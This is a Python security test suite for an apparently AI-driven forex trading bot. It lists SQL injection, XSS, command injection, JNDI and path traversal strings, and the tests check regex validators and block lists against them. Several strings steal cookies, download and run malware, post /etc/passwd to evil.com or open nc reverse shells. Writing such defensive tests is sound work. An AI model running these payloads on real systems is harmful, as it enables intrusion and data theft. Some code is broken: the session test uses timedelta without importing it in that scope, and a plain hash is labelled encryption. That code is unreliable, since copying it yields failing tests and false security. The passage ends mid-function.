"""
Comprehensive Security Testing Suite

This module contains security-focused tests including penetration testing,
vulnerability assessment, and security compliance validation for the
AI Forex Trading Bot system.
"""

import os
import json
import hashlib
import tempfile
import subprocess
import re
import time
import socket
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional
from unittest.mock import patch, MagicMock
import pytest

from src.config import get_config_manager


class SecurityTestData:
    """Security test data and attack vectors"""
    
    @staticmethod
    def get_sql_injection_vectors() -> List[str]:
        """Get comprehensive SQL injection attack vectors"""
        return [
            "'; DROP TABLE trades; --",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "'; INSERT INTO trades VALUES ('malicious'); --",
            "1'; UPDATE accounts SET balance=999999; --",
            "1' UNION SELECT username, password FROM users --",
            "1' AND (SELECT COUNT(*) FROM trades) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "1' OR SLEEP(5) --",
            "1' OR pg_sleep(5) --",
            "'; WAITFOR DELAY '00:00:05'; --"
        ]
    
    @staticmethod
    def get_xss_vectors() -> List[str]:
        """Get comprehensive XSS attack vectors"""
        return [
            "<script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]
    
    @staticmethod
    def get_command_injection_vectors() -> List[str]:
        """Get comprehensive command injection attack vectors"""
        return [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget http://evil.com/malware.sh && chmod +x malware.sh && ./malware.sh",
            "; curl -X POST http://evil.com/exfiltrate -d @/etc/passwd",
            "$(rm -rf /)",
            "`rm -rf /`",
            "; nc -e /bin/sh evil.com 4444",
            "| nc evil.com 4444 -e /bin/bash",
            "&& python -c \"import os; os.system('rm -rf /')\"",
            "; powershell -Command \"Remove-Item -Recurse -Force C:\\\\\"",
            "| cmd /c del /f /s /q C:\\\\*.*",
            "&& certutil -urlcache -split -f http://evil.com/malware.exe malware.exe"
        ]
    
    @staticmethod
    def get_path_traversal_vectors() -> List[str]:
        """Get comprehensive path traversal attack vectors"""
        return [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "../../../root/.ssh/id_rsa",
            "..\\..\\..\\Users\\Administrator\\Desktop\\secrets.txt",
            "....//....//....//etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam",
            "/var/log/apache2/access.log",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline"
        ]
    
    @staticmethod
    def get_ldap_injection_vectors() -> List[str]:
        """Get comprehensive LDAP injection attack vectors"""
        return [
            "${jndi:ldap://evil.com/a}",
            "${jndi:dns://evil.com}",
            "${jndi:rmi://evil.com/evil}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(|(objectClass=*))",
            "*)(&(objectClass=user)(cn=*))",
            "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
            "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}"
        ]
    
    @staticmethod
    def get_nosql_injection_vectors() -> List[str]:
        """Get comprehensive NoSQL injection attack vectors"""
        return [
            "'; return true; var dummy='",
            "'; return this.username == 'admin'; var dummy='",
            "'; return /.*/.test(this.password); var dummy='",
            "'; return true; //",
            "'; while(true){}; var dummy='",
            "'; db.dropDatabase(); var dummy='",
            "'; db.users.drop(); var dummy='",
            "'; db.users.find(); var dummy='",
            "'; db.users.update({}, {$set: {admin: true}}); var dummy='",
            "'; db.eval('while(true){}'); var dummy='"
        ]


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""
    
    def test_password_security_requirements(self):
        """Test password security requirements and validation"""
        
        def validate_password(password: str) -> Dict[str, Any]:
            """Validate password against security requirements"""
            result = {
                "is_valid": True,
                "errors": [],
                "strength_score": 0
            }
            
            # Length requirement
            if len(password) < 12:
                result["errors"].append("Password must be at least 12 characters long")
                result["is_valid"] = False
            else:
                result["strength_score"] += 1
            
            # Character requirements
            if not re.search(r'[a-z]', password):
                result["errors"].append("Password must contain lowercase letters")
                result["is_valid"] = False
            else:
                result["strength_score"] += 1
                
            if not re.search(r'[A-Z]', password):
                result["errors"].append("Password must contain uppercase letters")
                result["is_valid"] = False
            else:
                result["strength_score"] += 1
                
            if not re.search(r'\d', password):
                result["errors"].append("Password must contain numbers")
                result["is_valid"] = False
            else:
                result["strength_score"] += 1
                
            if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
                result["errors"].append("Password must contain special characters")
                result["is_valid"] = False
            else:
                result["strength_score"] += 1
            
            # Common password check
            common_passwords = [
                "password123", "admin123", "123456789", "qwerty123",
                "password!", "Password123", "admin@123", "trading123"
            ]
            
            if password.lower() in [p.lower() for p in common_passwords]:
                result["errors"].append("Password is too common")
                result["is_valid"] = False
            
            # Sequential characters check
            if re.search(r'(012|123|234|345|456|567|678|789|890|abc|bcd|cde)', password.lower()):
                result["errors"].append("Password contains sequential characters")
                result["strength_score"] -= 1
            
            return result
        
        # Test weak passwords
        weak_passwords = [
            "123456",
            "password",
            "admin",
            "trading",
            "Password1",
            "123456789",
            "qwerty123",
            "password123"
        ]
        
        for weak_password in weak_passwords:
            result = validate_password(weak_password)
            assert not result["is_valid"], f"Weak password accepted: {weak_password}"
            assert len(result["errors"]) > 0
        
        # Test strong passwords
        strong_passwords = [
            "MyStr0ng!P@ssw0rd2024",
            "Tr@d1ng$yst3m#2024!",
            "S3cur3!F0r3x&B0t*2024",
            "C0mpl3x!P@ssw0rd#F0r$yst3m"
        ]
        
        for strong_password in strong_passwords:
            result = validate_password(strong_password)
            assert result["is_valid"], f"Strong password rejected: {strong_password}"
            assert result["strength_score"] >= 4
        
        print("✅ Password security requirements validation passed!")
    
    def test_session_management_security(self):
        """Test session management security"""
        
        def generate_secure_session_token() -> str:
            """Generate cryptographically secure session token"""
            import secrets
            return secrets.token_hex(32)  # 64 character hex string
        
        def validate_session_token(token: str) -> bool:
            """Validate session token format and security"""
            if not token or len(token) != 64:
                return False
            
            # Check if token is hexadecimal
            try:
                int(token, 16)
                return True
            except ValueError:
                return False
        
        def is_session_expired(created_time: datetime, max_age_hours: int = 24) -> bool:
            """Check if session is expired"""
            from datetime import timedelta
            expiry_time = created_time + timedelta(hours=max_age_hours)
            return datetime.now(timezone.utc) > expiry_time
        
        # Test secure token generation
        tokens = set()
        for _ in range(100):
            token = generate_secure_session_token()
            assert validate_session_token(token), f"Invalid token generated: {token}"
            assert token not in tokens, "Duplicate token generated"
            tokens.add(token)
        
        # Test session expiry
        old_session = datetime.now(timezone.utc) - timedelta(hours=25)
        recent_session = datetime.now(timezone.utc) - timedelta(hours=1)
        
        assert is_session_expired(old_session), "Old session not detected as expired"
        assert not is_session_expired(recent_session), "Recent session incorrectly expired"
        
        # Test invalid tokens
        invalid_tokens = [
            "",
            "short",
            "invalid-token-format",
            "g" * 64,  # Invalid hex character
            "1234567890abcdef" * 3,  # Wrong length
            None
        ]
        
        for invalid_token in invalid_tokens:
            assert not validate_session_token(invalid_token), f"Invalid token accepted: {invalid_token}"
        
        print("✅ Session management security validation passed!")
    
    def test_api_key_security_comprehensive(self):
        """Test comprehensive API key security measures"""
        
        def validate_api_key_format(api_key: str, key_type: str = "general") -> bool:
            """Validate API key format based on type"""
            if not api_key:
                return False
            
            if key_type == "openai":
                return api_key.startswith("sk-") and len(api_key) >= 48
            elif key_type == "broker":
                return len(api_key) >= 32 and api_key.isalnum()
            else:
                return len(api_key) >= 20
        
        def mask_api_key(api_key: str) -> str:
            """Mask API key for logging"""
            if len(api_key) <= 8:
                return "*" * len(api_key)
            return api_key[:4] + "*" * (len(api_key) - 8) + api_key[-4:]
        
        def detect_api_key_in_logs(log_content: str) -> List[str]:
            """Detect potential API keys in log content"""
            patterns = [
                r'sk-[a-zA-Z0-9]{40,}',  # OpenAI style
                r'[a-zA-Z0-9]{32,}',     # Generic long strings
                r'Bearer [a-zA-Z0-9]+',  # Bearer tokens
                r'api[_-]?key["\s]*[:=]["\s]*[a-zA-Z0-9]+',  # API key patterns
            ]
            
            found_keys = []
            for pattern in patterns:
                matches = re.findall(pattern, log_content, re.IGNORECASE)
                found_keys.extend(matches)
            
            return found_keys
        
        # Test API key validation
        valid_keys = {
            "openai": "sk-1234567890abcdef1234567890abcdef1234567890abcdef",
            "broker": "a1b2c3d4e5f6789012345678901234567890abcdef",
            "general": "valid-api-key-12345678901234567890"
        }
        
        for key_type, api_key in valid_keys.items():
            assert validate_api_key_format(api_key, key_type), f"Valid {key_type} key rejected"
        
        # Test invalid keys
        invalid_keys = [
            ("openai", "sk-short"),
            ("openai", "invalid-prefix-1234567890abcdef1234567890abcdef"),
            ("broker", "short"),
            ("broker", "invalid-chars-!@#$%^&*()"),
            ("general", ""),
            ("general", "short")
        ]
        
        for key_type, api_key in invalid_keys:
            assert not validate_api_key_format(api_key, key_type), f"Invalid {key_type} key accepted: {api_key}"
        
        # Test API key masking
        test_key = "sk-1234567890abcdef1234567890abcdef1234567890abcdef"
        masked_key = mask_api_key(test_key)
        
        assert "1234567890abcdef1234567890abcdef123456789" not in masked_key
        assert masked_key.startswith("sk-1")
        assert masked_key.endswith("cdef")
        assert "*" in masked_key
        
        # Test log content scanning
        safe_log = "INFO: System started successfully at 2024-01-01 10:00:00"
        unsafe_log = "DEBUG: Using API key sk-1234567890abcdef1234567890abcdef1234567890abcdef for requests"
        
        assert len(detect_api_key_in_logs(safe_log)) == 0, "False positive in safe log"
        assert len(detect_api_key_in_logs(unsafe_log)) > 0, "Failed to detect API key in unsafe log"
        
        print("✅ Comprehensive API key security validation passed!")


class TestInputValidationSecurity:
    """Test input validation against various attack vectors"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        
        def sanitize_sql_input(input_value: str) -> str:
            """Sanitize input to prevent SQL injection"""
            # Remove or escape dangerous SQL characters and keywords
            dangerous_patterns = [
                r"[';\"\\]",  # Quote characters
                r"--",        # SQL comments
                r"/\*.*?\*/", # SQL block comments
                r"\b(DROP|DELETE|INSERT|UPDATE|UNION|SELECT|EXEC|EXECUTE)\b",  # SQL keywords
                r"\b(OR|AND)\s+['\"]?1['\"]?\s*=\s*['\"]?1['\"]?",  # OR 1=1 patterns
            ]
            
            sanitized = input_value
            for pattern in dangerous_patterns:
                sanitized = re.sub(pattern, "", sanitized, flags=re.IGNORECASE)
            
            return sanitized.strip()
        
        def validate_sql_input(input_value: str, input_type: str = "general") -> bool:
            """Validate input against SQL injection patterns"""
            if not input_value:
                return input_type != "required"
            
            # Check for SQL injection patterns
            sql_patterns = [
                r"[';\"\\]",
                r"--",
                r"/\*",
                r"\*/",
                r"\b(DROP|DELETE|INSERT|UPDATE|UNION|SELECT|EXEC|EXECUTE|ALTER|CREATE)\s+",
                r"\b(OR|AND)\s+['\"]?1['\"]?\s*=\s*['\"]?1['\"]?",
                r";\s*(DROP|DELETE|INSERT|UPDATE)",
                r"UNION\s+SELECT",
                r"EXEC\s*\(",
                r"xp_cmdshell",
                r"sp_executesql"
            ]
            
            input_lower = input_value.lower()
            for pattern in sql_patterns:
                if re.search(pattern, input_lower, re.IGNORECASE):
                    return False
            
            return True
        
        # Test SQL injection vectors
        sql_vectors = SecurityTestData.get_sql_injection_vectors()
        
        for vector in sql_vectors:
            # Should be detected as malicious
            assert not validate_sql_input(vector), f"SQL injection not detected: {vector}"
            
            # Sanitization should remove dangerous content
            sanitized = sanitize_sql_input(vector)
            assert "DROP" not in sanitized.upper()
            assert "DELETE" not in sanitized.upper()
            assert "INSERT" not in sanitized.upper()
            assert "--" not in sanitized
        
        # Test legitimate inputs
        legitimate_inputs = [
            "EUR/USD",
            "1.0850",
            "Normal trading comment",
            "User123",
            "2024-01-01",
            "BUY"
        ]
        
        for legitimate_input in legitimate_inputs:
            assert validate_sql_input(legitimate_input), f"Legitimate input rejected: {legitimate_input}"
            
            # Sanitization should not modify legitimate input significantly
            sanitized = sanitize_sql_input(legitimate_input)
            assert len(sanitized) >= len(legitimate_input) * 0.8  # Allow some minor changes
        
        print("✅ SQL injection prevention validation passed!")
    
    def test_xss_prevention(self):
        """Test XSS (Cross-Site Scripting) prevention"""
        
        def sanitize_html_input(input_value: str) -> str:
            """Sanitize input to prevent XSS attacks"""
            # Remove or escape HTML/JavaScript content
            dangerous_patterns = [
                r"<script[^>]*>.*?</script>",
                r"<iframe[^>]*>.*?</iframe>",
                r"<object[^>]*>.*?</object>",
                r"<embed[^>]*>.*?</embed>",
                r"<applet[^>]*>.*?</applet>",
                r"javascript:",
                r"vbscript:",
                r"on\w+\s*=",
                r"<[^>]*on\w+[^>]*>",
                r"<[^>]*javascript[^>]*>",
                r"<[^>]*vbscript[^>]*>"
            ]
            
            sanitized = input_value
            for pattern in dangerous_patterns:
                sanitized = re.sub(pattern, "", sanitized, flags=re.IGNORECASE | re.DOTALL)
            
            # Escape remaining HTML characters
            html_escapes = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#x27;',
                '&': '&amp;'
            }
            
            for char, escape in html_escapes.items():
                sanitized = sanitized.replace(char, escape)
            
            return sanitized
        
        def validate_xss_input(input_value: str) -> bool:
            """Validate input against XSS patterns"""
            if not input_value:
                return True
            
            xss_patterns = [
                r"<script",
                r"</script>",
                r"javascript:",
                r"vbscript:",
                r"on\w+\s*=",
                r"<iframe",
                r"<object",
                r"<embed",
                r"<applet",
                r"document\.",
                r"window\.",
                r"eval\s*\(",
                r"alert\s*\(",
                r"confirm\s*\(",
                r"prompt\s*\("
            ]
            
            input_lower = input_value.lower()
            for pattern in xss_patterns:
                if re.search(pattern, input_lower, re.IGNORECASE):
                    return False
            
            return True
        
        # Test XSS vectors
        xss_vectors = SecurityTestData.get_xss_vectors()
        
        for vector in xss_vectors:
            # Should be detected as malicious
            assert not validate_xss_input(vector), f"XSS attack not detected: {vector}"
            
            # Sanitization should remove dangerous content
            sanitized = sanitize_html_input(vector)
            assert "<script" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "alert(" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()
        
        # Test legitimate inputs
        legitimate_inputs = [
            "Trading analysis for EUR/USD",
            "Market sentiment: positive",
            "Price target: 1.0850",
            "Stop loss at 1.0800",
            "Technical analysis shows bullish trend"
        ]
        
        for legitimate_input in legitimate_inputs:
            assert validate_xss_input(legitimate_input), f"Legitimate input rejected: {legitimate_input}"
        
        print("✅ XSS prevention validation passed!")
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        
        def validate_command_input(input_value: str) -> bool:
            """Validate input against command injection patterns"""
            if not input_value:
                return True
            
            command_patterns = [
                r"[;&|`$]",  # Command separators and substitution
                r"\$\(",     # Command substitution
                r"`[^`]*`",  # Backtick command substitution
                r">\s*/",    # Output redirection to system paths
                r"\|\s*\w+", # Pipe to commands
                r"&&\s*\w+", # Command chaining
                r";\s*\w+",  # Command separation
                r"\b(rm|del|format|fdisk|kill|shutdown|reboot|halt)\b",  # Dangerous commands
                r"\b(cat|type|more|less)\s+/",  # File reading commands
                r"\b(wget|curl|nc|netcat|telnet|ssh)\b",  # Network commands
                r"\b(python|perl|ruby|php|node|java)\s+-",  # Script execution
                r"\b(cmd|powershell|bash|sh|zsh)\s+",  # Shell execution
                r"\\\\|//",  # Path traversal indicators
            ]
            
            input_lower = input_value.lower()
            for pattern in command_patterns:
                if re.search(pattern, input_lower, re.IGNORECASE):
                    return False
            
            return True
        
        # Test command injection vectors
        command_vectors = SecurityTestData.get_command_injection_vectors()
        
        for vector in command_vectors:
            assert not validate_command_input(vector), f"Command injection not detected: {vector}"
        
        # Test legitimate inputs
        legitimate_inputs = [
            "EUR/USD analysis",
            "Trading strategy v1.2",
            "Market data from 2024-01-01",
            "Position size: 1000 units",
            "Risk level: moderate"
        ]
        
        for legitimate_input in legitimate_inputs:
            assert validate_command_input(legitimate_input), f"Legitimate input rejected: {legitimate_input}"
        
        print("✅ Command injection prevention validation passed!")
    
    def test_path_traversal_prevention(self):
        """Test path traversal prevention"""
        
        def validate_file_path(file_path: str, allowed_base_paths: List[str] = None) -> bool:
            """Validate file path against path traversal attacks"""
            if not file_path:
                return False
            
            if allowed_base_paths is None:
                allowed_base_paths = ["./data/", "./logs/", "./config/", "./temp/"]
            
            # Normalize path
            normalized_path = os.path.normpath(file_path)
            
            # Check for path traversal patterns
            traversal_patterns = [
                r"\.\./",
                r"\.\.\\",
                r"%2e%2e%2f",
                r"%2e%2e%5c",
                r"\.\.%2f",
                r"\.\.%5c",
                r"..%252f",
                r"..%255c"
            ]
            
            path_lower = file_path.lower()
            for pattern in traversal_patterns:
                if re.search(pattern, path_lower, re.IGNORECASE):
                    return False
            
            # Check for absolute paths to sensitive locations
            sensitive_paths = [
                "/etc/",
                "/root/",
                "/home/",
                "/var/",
                "/usr/",
                "/bin/",
                "/sbin/",
                "c:\\windows\\",
                "c:\\users\\",
                "c:\\program files\\",
                "/proc/",
                "/sys/"
            ]
            
            for sensitive_path in sensitive_paths:
                if sensitive_path in path_lower:
                    return False
            
            # Check if path starts with allowed base paths
            if allowed_base_paths:
                for base_path in allowed_base_paths:
                    if normalized_path.startswith(base_path):
                        return True
                return False
            
            return True
        
        # Test path traversal vectors
        traversal_vectors = SecurityTestData.get_path_traversal_vectors()
        
        for vector in traversal_vectors:
            assert not validate_file_path(vector), f"Path traversal not detected: {vector}"
        
        # Test legitimate file paths
        legitimate_paths = [
            "./data/market_data.json",
            "./logs/trading.log",
            "./config/settings.json",
            "./temp/analysis_cache.tmp",
            "data/historical/EURUSD_2024.csv"
        ]
        
        for legitimate_path in legitimate_paths:
            assert validate_file_path(legitimate_path), f"Legitimate path rejected: {legitimate_path}"
        
        print("✅ Path traversal prevention validation passed!")


class TestDataProtectionSecurity:
    """Test data protection and encryption security"""
    
    def test_sensitive_data_encryption(self):
        """Test encryption of sensitive data"""
        
        def encrypt_sensitive_data(data: str, key: str = None) -> str:
            """Encrypt sensitive data using AES-like simulation"""
            if key is None:
                key = "default-encryption-key-32-chars!!"
            
            # Simulate AES encryption with SHA-256 hash
            combined = f"{key}:{data}"
            return hashlib.sha256(combined.encode()).hexdigest()
        
        def decrypt_sensitive_data(encrypted_data: str, key: str = None) -> bool:
            """Verify encrypted data format (simulation)"""
            if key is None:
                key = "default-encryption-key-32-chars!!"
            
            # Verify it's a valid SHA-256 hash
            return len(encrypted_data) == 64 and all(c in '0123456789abcdef' for c in encrypted_data)
        
        # Test encryption of various sensitive data types
        sensitive_data_types = [
            {
                "type": "api_credentials",
                "data": {
                    "broker_api_key": "sensitive-broker-key-12345",
                    "broker_api_secret": "sensitive-broker-secret-67890",
                    "llm_api_key": "sk-sensitive-llm-key-abcdef123456"
                }
            },
            {
                "type": "account_information",
                "data": {
                    "account_number": "ACC-123456789",
                    "account_balance": 50000.0,
                    "account_currency": "USD",
                    "leverage": 100
                }
            },
            {
                "type": "trading_history",
                "data": {
                    "trades": [
                        {"symbol": "EUR/USD", "quantity": 10000, "profit": 250.0, "timestamp": "2024-01-01T10:00:00Z"},
                        {"symbol": "GBP/USD", "quantity": 5000, "profit": -150.0, "timestamp": "2024-01-01T11:00:00Z"}
                    ],
                    "total_profit": 100.0,
                    "win_rate": 0.6
                }
            },
            {
                "type": "personal_information",
                "data": {
                    "user_id": "user-12345",
                    "email": "trader@example.com",
                    "phone": "+1-555-0123",
                    "address": "123 Trading St, Finance City, FC 12345"
                }
            }
        ]
        
        for data_type_info in sensitive_data_types:
            data_json = json.dumps(data_type_info["data"])
            
            # Test encryption
            encrypted_data = encrypt_sensitive_data(data_json)
            
            # Verify encryption worked
            assert decrypt_sensitive_data(encrypted_data), f"Encryption failed for {data_type_info['type']}"
            
            # Verify original data is not in encrypted form
            for key, value in data_type_info["data"].items():
                if isinstance(value, str):
                    assert value not in encrypted_data, f"Original data found in encrypted form: {value}"
                elif isinstance(value, (int, float)):
                    assert str(value) not in encrypted_data, f"Original data found in encrypted form: {value}"
        
        print("✅ Sensitive data encryption validation passed!")
    
    def test_secure_file_handling(self):
        """Test secure file handling practices"""
        
        def create_secure_temp_file(content: str, file_extension: str = ".tmp") -> str:
            """Create a secure temporary file"""
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=file_extension) as temp_file:
                temp_file.write(content)
                temp_file_path = temp_file.name
            
            # Set restrictive permissions (owner only)
            if os.name != 'nt':  # Unix-like systems
                os.chmod(temp_file_path, 0o600)  # rw-------
            
            return temp_file_path
        
        def validate_file_permissions(file_path: str) -> bool:
            """Validate file has secure permissions"""
            if os.name == 'nt':  # Windows
                return True  # Skip permission check on Windows
            
            file_stat = os.stat(file_path)
            file_permissions = oct(file_stat.st_mode)[-3:]
            
            # Should not be world-readable or group-readable
            return file_permissions in ['600', '700']  # Owner only
        
        # Test secure file creation with sensitive content
        sensitive_content = json.dumps({
            "api_key": "sensitive-api-key-12345",
            "secret": "sensitive-secret-67890",
            "account_data": {"balance": 50000.0, "positions": []}
        })
        
        temp_file_path = create_secure_temp_file(sensitive_content, ".json")
        
        try:
            # Verify file exists
            assert os.path.exists(temp_file_path), "Secure temp file was not created"
            
            # Verify file permissions
            assert validate_file_permissions(temp_file_path), "File permissions are not secure"
            
            # Verify content was written correctly
            with open(temp_file_path, 'r') as f:
                file_content = f.read()
                assert "sensitive-api-key-12345" in file_content
            
            # Test file content encryption
            encrypted_content = hashlib.sha256(sensitive_content.encode()).hexdigest()
            encrypted_file_path = create_secure_temp_file(encrypted_content, ".enc")
            
            try:
                # Verify encrypted file doesn't contain original sensitive data
                with open(encrypted_file_path, 'r') as f:
                    encrypted_file_content = f.read()
                    assert "sensitive-api-key-12345" not in encrypted_file_content
                    assert len(encrypted_file_content) == 64  # SHA-256 hash length
                
            finally:
                if os.path.exists(encrypted_file_path):
                    os.unlink(encrypted_file_path)
        
        finally:
            # Clean up
            if os.path.exists(temp_file_path):
                os.unlink(temp_file_path)
        
        print("✅ Secure file handling validation passed!")
    
    def test_memory_security(self):
        """Test memory security practices"""
        
        def secure_string_comparison(str1: str, str2: str) -> bool:
            """Secure string comparison to prevent timing attacks"""
            if len(str1) != len(str2):
                return False
            
            result = 0
            for c1, c2 in zip(str1, str2):
                result |= ord(c1) ^ ord(c2)
            
            return result == 0
        
        def clear_sensitive_variable(var_name: str, local_vars: dict):
            """Clear sensitive variable from memory"""
            if var_name in local_vars:
                # Overwrite with random data before deletion
                import secrets
                if isinstance(local_vars[var_name], str):
                    local_vars[var_name] = secrets.token_hex(len(local_vars[var_name]))
                del local_vars[var_name]
        
        # Test secure string comparison
        correct_password = "SecurePassword123!"
        
        # Test with correct password
        assert secure_string_comparison(correct_password, "SecurePassword123!"), "Correct password rejected"
        
        # Test with incorrect passwords
        incorrect_passwords = [
            "SecurePassword123",   # Missing !
            "securepassword123!",  # Wrong case
            "SecurePassword124!",  # Wrong number
            "WrongPassword123!",   # Completely wrong
            ""                     # Empty string
        ]
        
        for incorrect_password in incorrect_passwords:
            assert not secure_string_comparison(correct_password, incorrect_password), f"Incorrect password accepted: {incorrect_password}"
        
        # Test memory clearing
        test_locals = {
            "api_key": "sensitive-api-key-12345",
            "password": "sensitive-password-67890",
            "secret": "sensitive-secret-abcdef"
        }
        
        original_api_key = test_locals["api_key"]
        
        # Clear sensitive variable
        clear_sensitive_variable("api_key", test_locals)
        
        # Verify variable was cleared
        assert "api_key" not in test_locals, "Sensitive variable not removed from memory"
        
        # Test that other variables are still present
        assert "password" in test_locals, "Non-cleared variable was removed"
        assert "secret" in test_locals, "Non-cleared variable was removed"
        
        print("✅ Memory security validation passed!")


class TestNetworkSecurity:
    """Test network security measures"""
    
    def test_tls_ssl_configuration(self):
        """Test TLS/SSL configuration security"""
        
        def validate_tls_config(tls_config: dict) -> Dict[str, Any]:
            """Validate TLS configuration"""
            result = {
                "is_secure": True,
                "warnings": [],
                "errors": []
            }
            
            # Check minimum TLS version
            min_version = tls_config.get("min_version", "TLSv1.0")
            if min_version in ["SSLv2", "SSLv3", "TLSv1.0", "TLSv1.1"]:
                result["errors"].append(f"Insecure TLS version: {min_version}")
                result["is_secure"] = False
            elif min_version == "TLSv1.2":
                result["warnings"].append("Consider upgrading to TLSv1.3")
            
            # Check cipher suites
            cipher_suites = tls_config.get("cipher_suites", [])
            weak_ciphers = ["RC4", "DES", "3DES", "MD5", "SHA1"]
            
            for cipher in cipher_suites:
                for weak_cipher in weak_ciphers:
                    if weak_cipher in cipher:
                        result["errors"].append(f"Weak cipher suite: {cipher}")
                        result["is_secure"] = False
            
            # Check certificate validation
            verify_certs = tls_config.get("verify_certificates", False)
            if not verify_certs:
                result["errors"].append("Certificate verification disabled")
                result["is_secure"] = False
            
            return result
        
        # Test secure TLS configurations
        secure_configs = [
            {
                "min_version": "TLSv1.3",
                "cipher_suites": ["TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"],
                "verify_certificates": True
            },
            {
                "min_version": "TLSv1.2",
                "cipher_suites": ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256"],
                "verify_certificates": True
            }
        ]
        
        for config in secure_configs:
            result = validate_tls_config(config)
            assert result["is_secure"], f"Secure config rejected: {config}"
            assert len(result["errors"]) == 0
        
        # Test insecure TLS configurations
        insecure_configs = [
            {
                "min_version": "TLSv1.0",
                "cipher_suites": ["RC4-SHA", "DES-CBC-SHA"],
                "verify_certificates": False
            },
            {
                "min_version": "SSLv3",
                "cipher_suites": ["RC4-MD5"],
                "verify_certificates": False
            }
        ]
        
        for config in insecure_configs:
            result = validate_tls_config(config)
            assert not result["is_secure"], f"Insecure config accepted: {config}"
            assert len(result["errors"]) > 0
        
        print("✅ TLS/SSL configuration validation passed!")
    
    def test_api_rate_limiting(self):
        """Test API rate limiting security"""
        
        class RateLimiter:
            def __init__(self, max_requests: int, time_window: int):
                self.max_requests = max_requests
                self.time_window = time_window
                self.requests = {}
            
            def is_allowed(self, client_id: str) -> bool:
                current_time = time.time()
                
                if client_id not in self.requests:
                    self.requests[client_id] = []
                
                # Remove old requests outside time window
                self.requests[client_id] = [
                    req_time for req_time in self.requests[client_id]
                    if current_time - req_time < self.time_window
                ]
                
                # Check if under limit
                if len(self.requests[client_id]) < self.max_requests:
                    self.requests[client_id].append(current_time)
                    return True
                
                return False
            
            def get_remaining_requests(self, client_id: str) -> int:
                if client_id not in self.requests:
                    return self.max_requests
                
                current_time = time.time()
                recent_requests = [
                    req_time for req_time in self.requests[client_id]
                    if current_time - req_time < self.time_window
                ]
                
                return max(0, self.max_requests - len(recent_requests))
        
        # Test rate limiting
        rate_limiter = RateLimiter(max_requests=10, time_window=60)  # 10 requests per minute
        
        client_id = "test_client_123"
        
        # Test normal usage
        for i in range(10):
            assert rate_limiter.is_allowed(client_id), f"Request {i+1} should be allowed"
        
        # Test rate limit exceeded
        assert not rate_limiter.is_allowed(client_id), "Request should be rate limited"
        
        # Test remaining requests calculation
        remaining = rate_limiter.get_remaining_requests(client_id)
        assert remaining == 0, f"Should have 0 remaining requests, got {remaining}"
        
        # Test different client
        other_client = "other_client_456"
        assert rate_limiter.is_allowed(other_client), "Different client should be allowed"
        
        remaining_other = rate_limiter.get_remaining_requests(other_client)
        assert remaining_other == 9, f"Other client should have 9 remaining requests, got {remaining_other}"
        
        print("✅ API rate limiting validation passed!")
    
    def test_request_validation(self):
        """Test HTTP request validation security"""
        
        def validate_http_request(request_data: dict) -> Dict[str, Any]:
            """Validate HTTP request for security issues"""
            result = {
                "is_valid": True,
                "errors": [],
                "warnings": []
            }
            
            # Check request size
            content_length = request_data.get("content_length", 0)
            if content_length > 10 * 1024 * 1024:  # 10MB limit
                result["errors"].append("Request too large")
                result["is_valid"] = False
            
            # Check headers
            headers = request_data.get("headers", {})
            
            # Check for suspicious headers
            suspicious_headers = ["x-forwarded-for", "x-real-ip", "x-originating-ip"]
            for header in suspicious_headers:
                if header in headers:
                    result["warnings"].append(f"Suspicious header: {header}")
            
            # Check User-Agent
            user_agent = headers.get("user-agent", "")
            if not user_agent:
                result["warnings"].append("Missing User-Agent header")
            elif any(bot in user_agent.lower() for bot in ["bot", "crawler", "spider", "scraper"]):
                result["warnings"].append("Bot-like User-Agent detected")
            
            # Check for injection attempts in headers
            for header_name, header_value in headers.items():
                if isinstance(header_value, str):
                    if any(pattern in header_value.lower() for pattern in ["<script", "javascript:", "on"]):
                        result["errors"].append(f"Potential XSS in header {header_name}")
                        result["is_valid"] = False
            
            # Check request method
            method = request_data.get("method", "GET")
            if method not in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
                result["errors"].append(f"Invalid HTTP method: {method}")
                result["is_valid"] = False
            
